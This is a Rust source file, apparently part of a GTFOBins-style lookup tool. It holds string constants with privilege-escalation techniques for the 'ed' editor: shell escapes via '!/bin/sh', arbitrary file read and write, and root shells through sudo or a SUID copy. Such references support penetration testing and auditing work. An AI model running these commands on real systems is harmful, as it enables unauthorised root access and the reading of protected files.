
pub static BIN_NAME: &'static str = "ed";
pub static SH_CODE: &'static str = r#"
    
    ed
    !/bin/sh
"#;
pub static FW_CODE: &'static str = r#"
    
    ed file_to_write
    a
    DATA
    .
    w
    q
"#;
pub static FR_CODE: &'static str = r#"
    
    ed file_to_read
    ,p
    q
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which ed) .

    ./ed file_to_read
    ,p
    q
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo ed
    !/bin/sh
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which ed) .

    ./ed
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static FW: Code<'static> = Code { 
	title: "FW_CODE",
	code: FW_CODE,
	tag: Tag::FW,
};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
